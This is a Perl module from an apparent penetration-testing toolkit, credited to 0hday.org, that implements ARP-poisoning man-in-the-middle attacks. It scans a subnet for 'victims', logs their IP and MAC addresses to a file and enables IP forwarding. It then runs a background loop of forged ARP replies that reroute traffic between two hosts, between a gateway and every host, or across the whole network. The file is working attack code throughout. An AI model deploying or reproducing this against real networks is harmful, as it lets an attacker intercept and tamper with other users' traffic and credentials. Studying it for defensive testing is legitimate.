#!/usr/bin/perl
#
# This is propietary code of 0hday.org for enciclopedia
# pentestica, this is is released under beerware license
# don't remove this headers and send comments to flames@0hday.org
# (YES it does exist, ping emails will not be answered)
#
# Jorge A. Trujillo <crypkey@0hday.org>
# F. Javier Carlos Rivera <nediam@nediam.com.mx>
# Enrique A. Sanchez Montellano <nahual@0hday.org>
#
#
# Trapper_APR : Trapper module that contains functions related to ARP Poisoning Routing (APR) mode
#

package Trapper_APR;
use Exporter 'import';
use Time::HiRes qw( sleep );
use Net::Ping;
use Net::Pcap;
use Net::ARP;
use Proc::Simple;
use Net::Frame::Layer::ARP qw(:consts);
use Net::Frame::Simple;
use Net::Frame::Dump::Online2;
use NetPacket::IP qw(:strip);       
use NetPacket::TCP;
use NetPacket::UDP;

@EXPORT = qw(scan_hosts infect_hosts do_arp_one_to_one do_arp_one_to_all do_arp_all send_arp_packet aprcheck);
$| = 1;

# Function that scans the network looking for hosts (victims)
sub scan_hosts {
	($dev, $ip_attacker, $mac_attacker, $ip_target, $ip_begin, $ip_end) = @_;
	$victims = 0;
	print "[*] Scanning range from $ip_begin to $ip_end...\n";
	$oDump = Net::Frame::Dump::Online2->new(
											dev	=> $dev,
											timeoutOnNext  => 1,
											filter	=> 'arp',
											timeout  => 0,
											promisc  => 0,
	);
	$oDump->start;
	# ARP Requests to check who is alive
	my $scan_ip = new Net::IP ("$ip_begin - $ip_end") || die ("\nError: Can't scan the hosts, check the range IPs\n");
	do {
		print "Scanning IP " . $dst_ip . "\n";
		$dst_ip = $scan_ip->ip();
		if($dst_ip eq $ip_attacker) { print "[*] Skipping our host (IP attacker): " . $ip_attacker . "\n"; }
		elsif($dst_ip eq $ip_target) { print "[*] Skipping target host (IP target): " . $ip_target . "\n"; }
		else { send_arp_packet($dev, $ip_attacker, $dst_ip, $mac_attacker, 'ff:ff:ff:ff:ff:ff', 'request'); }
	} while (++$scan_ip);
	open(FH,">hosts.txt");
	until ($oDump->timeout) {
		if ($h = $oDump->next) {
			$r = Net::Frame::Simple->newFromDump($h);
			next unless $r->ref->{ARP}->opCode eq NF_ARP_OPCODE_REPLY && $r->ref->{ARP}->dstIp eq $ip_attacker;
			$srcIp = $r->ref->{ARP}->srcIp;
			$arpmac = $r->ref->{ARP}->src; 
			$ipmac = "$srcIp=$arpmac";
			@victims = (@victims,$ipmac);
			$victims++;
			print "[*] Victim IP: $srcIp \tMAC: $arpmac\n";
			print FH "Victim IP: $srcIp \tMAC: $arpmac\n";
		}
	}
	$oDump->timeoutReset;
	$oDump->stop;
	close(FH);
	# Scan hosts finished
	print "[*] Hosts found: $victims\n";
	return @victims;
}

# Function that infects the subnet depending of the type of APR type, creates a process and leaves it in background
sub infect_hosts {
	($dev, $mac_attacker, $ip_target1, $mac_target1, $ip_target2, $mac_target2, $op, $timeapr, @victims) = @_;
	`echo 1 > /proc/sys/net/ipv4/ip_forward`;
	print "[*] Infecting Host(s)...\n";
	$arp_bk = Proc::Simple->new();
	$time = 2.0;
	if (defined($timeapr)) { $time = $timeapr; }
	if ($op eq "1") { $arp_status = $arp_bk->start(\&do_arp_one_to_one, $dev, $mac_attacker, $ip_target1, $mac_target1, $ip_target2, $mac_target2); }
	elsif ($op eq "2") { $arp_status = $arp_bk->start(\&do_arp_one_to_all, $dev, $mac_attacker, $ip_target1, $mac_target1, @victims); }
	elsif ($op eq "3") { $arp_status = $arp_bk->start(\&do_arp_all, $dev, $mac_attacker, @victims); }
	$pid = $arp_bk->pid;
	open(pid,">trapper.pid") || die("Error: Can't save trapper.pid file.");
	print pid "$pid";
	close(pid); 
	print "[*] Leaving arp-poison into background: pid $pid ...\n";
}

# ARP-Poison one to one: to poison all network traffic between two single hosts
sub do_arp_one_to_one {
	($dev, $mac_attacker, $ip_target1, $mac_target1, $ip_target2, $mac_target2) = @_;
	# First let's send 2 arp request between target1 and target2
	# Request 1: Who has IP_TARGET1? Tell IP_TARGET2 
	send_arp_packet($dev, $ip_target1, $ip_target2, $mac_attacker, $mac_target2, 'request');
	#Now we send 2 ARP replies
	while(1) {
		send_arp_packet($dev, $ip_target2, $ip_target1, $mac_attacker, $mac_target1, 'reply');
		send_arp_packet($dev, $ip_target1, $ip_target2, $mac_attacker, $mac_target2, 'reply');
		sleep($time);
	}
}

# ARP-Poison one to all: to poison all traffic between a host (most of the times it's the default gateway) and the rest of the hosts in the subnet
sub do_arp_one_to_all {
	($dev, $mac_attacker, $ip_target, $mac_target, @victims) = @_;
	while(1) {
		foreach $row_victim (@victims) {
			($ip_victim, $mac_victim) = split(/=/, $row_victim);
			if ($ip_target ne $ip_victim) {
				# ARP-reply attack to the target host telling "Hey, I (victim IP) have this MAC (attacker MAC)" 
				send_arp_packet($dev, $ip_victim, $ip_target, $mac_attacker, $mac_target, 'reply');
				# ARP-reply attack to every host in the network telling "Hey, I (target IP) have this MAC (attacker MAC)" 
				send_arp_packet($dev, $ip_target, $ip_victim, $mac_attacker, $mac_victim, 'reply');
			}
		}
		sleep($time);
	}
}

# Arp-Poison all: Poison entire network
sub do_arp_all {
	($dev, $mac_attacker, @victims) = @_;
	$tot_victims = $#victims + 1;
	while (1) {
		foreach $row_src (@victims) {
			foreach $row_dst (@victims) {
				if($row_src ne $row_dst) { 
					($ip_src, $mac_src) = split(/=/, $row_src);
					($ip_dst, $mac_dst) = split(/=/, $row_dst);
					send_arp_packet($dev, $ip_src, $ip_dst, $mac_attacker, $mac_dst, 'reply');
				}
			}
		}
		sleep($time);
	}
}

# Function that send an ARP packet
sub send_arp_packet {
	($dev, $ip_src, $ip_dst, $mac_src, $mac_dst, $type) = @_;			
			Net::ARP::send_packet("$dev",			# Device
								  "$ip_src",		# Source IP
								  "$ip_dst",		# Destination IP
								  "$mac_src",		# Source MAC
								  "$mac_dst",		# Destination MAC
								  "$type");			# ARP message
}

sub aprcheck {
	$running = $arp_bk->poll();
	if (defined($running)) {
		$arp_bk->kill();
	}
}

1;
